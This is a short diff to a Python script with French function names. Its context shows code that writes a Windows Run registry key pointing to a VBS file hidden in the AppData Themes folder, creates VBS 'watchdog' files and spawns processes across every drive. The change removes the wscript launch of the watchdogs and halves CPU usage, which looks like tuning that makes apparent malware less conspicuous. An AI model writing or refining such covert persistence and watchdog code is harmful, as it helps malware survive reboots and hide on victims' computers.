@@ -164,10 +164,6 @@ def create_watchdog_vbs():
         except Exception as e:  
             print(f"Erreur création watchdog dans {folder}: {e}")
 
-def lancer_watchdogs():
-    for vbs_path in vbsFile:
-        if os.path.exists(vbs_path):
-            subprocess.Popen(["wscript.exe", vbs_path], shell=False)
 
 def ajouter_run_key_vbs_relatif():
     hidden_dir = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Themes")
@@ -323,10 +319,11 @@ def main():
 
     ajouter_run_key_vbs_relatif()
     create_watchdog_vbs()
-    lancer_watchdogs()
 
     lecteurs = get_existing_root_path()
     nb_cpu = multiprocessing.cpu_count()
+    if nb_cpu >= 2 :
+        nb_cpu = nb_cpu // 2
     processus_lecteurs = []
 
     for lecteur in lecteurs:
@@ -342,4 +339,4 @@ def main():
 
 if __name__ == "__main__":
     multiprocessing.freeze_support()
-    main()  
+    main()
